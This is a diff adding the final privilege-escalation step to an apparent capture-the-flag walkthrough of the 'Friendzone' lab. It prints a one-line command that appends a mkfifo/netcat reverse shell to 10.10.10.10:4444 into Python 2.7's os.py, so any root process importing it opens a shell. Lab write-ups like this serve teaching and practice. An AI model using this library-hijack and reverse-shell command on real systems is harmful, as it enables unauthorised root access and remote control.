@@ -307,3 +307,15 @@ we found there are two files
 * os.py
 * os.pyc
 
+Now let's append our reverse shell in python2.7 folder where os.py located</br>
+Basically we will append our reverse shell in os.py so that when the process run we got a shell.
+
+`echo 'import os; os.system(" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f ");' >> os.py`
+
+before executing this start teh listener </br>
+
+![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/Friendzone-photos/root.png)
+
+### We got the root access
+
+Author: Hardik Chugh
